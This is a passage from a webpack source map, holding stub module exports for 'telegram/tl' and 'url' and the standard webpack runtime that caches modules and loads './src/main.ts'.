require(\"telegram/tl\");","module.exports = require(\"url\");","// The module cache\nvar __webpack_module_cache__ = {};\n\n// The require function\nfunction __webpack_require__(moduleId) {\n\t// Check if module is in cache\n\tvar cachedModule = __webpack_module_cache__[moduleId];\n\tif (cachedModule !== undefined) {\n\t\treturn cachedModule.exports;\n\t}\n\t// Create a new module (and put it into the cache)\n\tvar module = __webpack_module_cache__[moduleId] = {\n\t\t// no module.id needed\n\t\t// no module.loaded needed\n\t\texports: {}\n\t};\n\n\t// Execute the module function\n\t__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n\n\t// Return the exports of the module\n\treturn module.exports;\n}\n\n","","// startup\n// Load entry module and return exports\n// This entry module is referenced by other modules so it can't be inlined\nvar __webpack_exports__ = __webpack_require__(\"./src/main.ts\");\n",""],"names":[],"sourceRoot":""}